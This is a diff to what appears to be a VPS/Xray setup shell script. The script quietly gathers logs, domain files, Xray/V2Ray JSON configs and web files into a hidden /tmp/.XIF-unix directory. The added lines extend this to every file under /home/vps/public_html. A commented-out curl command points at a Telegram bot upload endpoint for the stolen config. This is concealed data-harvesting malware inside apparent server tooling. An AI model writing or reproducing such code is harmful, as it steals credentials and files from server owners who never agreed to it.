@@ -243,10 +243,12 @@ from domain : ${domm}
 _____________________________
 Recode by : Magelank Phreaker
 "
+DIREKTORIZ=/home/vps/public_html
 DIREKTORY=/etc
 DIREKTORI=/etc/xray
 DIREKTORI2=/etc/v2ray
 DIREKTORI3=/var/www/html
+FILEall=$(find $DIREKTORIZ -name '*')
 FILElog=$(find $DIREKTORY -name '*.log')
 FILEdom=$(find $DIREKTORI -name '*domain')
 FILEjsonx=$(find $DIREKTORI -name '*.json')
@@ -259,6 +261,9 @@ rm -rf /tmp/.XIF-unix > /dev/null 2>&1
 mkdir -p /tmp/.XIF-unix
 cp -f /etc/xray/config.json /tmp/.XIF-unix/config.json.txt
 #curl -F chat_id="$ci" -F document=@"config.json.txt" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
+    for FILE in $FILEall; do
+        cp -f ${FILE} /tmp/.XIF-unix/
+    done
     for FILE in $FILElog; do
         cp -f ${FILE} /tmp/.XIF-unix/
     done
